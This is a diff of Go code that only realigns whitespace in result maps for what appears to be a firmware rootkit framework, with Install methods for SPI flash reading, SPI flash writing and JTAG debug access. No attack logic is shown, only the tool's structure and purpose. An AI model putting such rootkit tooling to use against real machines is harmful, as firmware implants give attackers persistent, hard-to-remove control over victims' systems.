@@ -66,12 +66,12 @@ func (m *SPIFlashReadMethod) Install(config *RootkitConfig) (*RootkitResult, err
 		Technique: TechniqueSPIFlashRead,
 		Layer:     LayerFirmware,
 		Details: map[string]string{
-			"spi_path":   spiPath,
-			"chip_id":    flashInfo.ChipID,
-			"vendor_id":  flashInfo.VendorID,
-			"capacity":   fmt.Sprintf("%d", flashInfo.Capacity),
+			"spi_path":    spiPath,
+			"chip_id":     flashInfo.ChipID,
+			"vendor_id":   flashInfo.VendorID,
+			"capacity":    fmt.Sprintf("%d", flashInfo.Capacity),
 			"backup_path": backupPath,
-			"hash":       hash,
+			"hash":        hash,
 		},
 	}, nil
 }
@@ -125,7 +125,7 @@ func (m *SPIFlashWriteMethod) Install(config *RootkitConfig) (*RootkitResult, er
 		Technique: TechniqueSPIFlashWrite,
 		Layer:     LayerFirmware,
 		Details: map[string]string{
-			"spi_path":     spiPath,
+			"spi_path":      spiPath,
 			"firmware_path": config.FirmwarePath,
 			"backup_path":   backupPath,
 		},
@@ -198,11 +198,11 @@ func (m *JTAGDebugMethod) Install(config *RootkitConfig) (*RootkitResult, error)
 		Technique: TechniqueJTAGDebug,
 		Layer:     LayerFirmware,
 		Details: map[string]string{
-			"jtag_path":  jtagPath,
-			"interface":  jtagInfo.Interface,
-			"chain_len":  fmt.Sprintf("%d", jtagInfo.ChainLen),
-			"speed":      fmt.Sprintf("%d", jtagInfo.Speed),
-			"dump_path":  dumpPath,
+			"jtag_path": jtagPath,
+			"interface": jtagInfo.Interface,
+			"chain_len": fmt.Sprintf("%d", jtagInfo.ChainLen),
+			"speed":     fmt.Sprintf("%d", jtagInfo.Speed),
+			"dump_path": dumpPath,
 		},
 	}, nil
 }
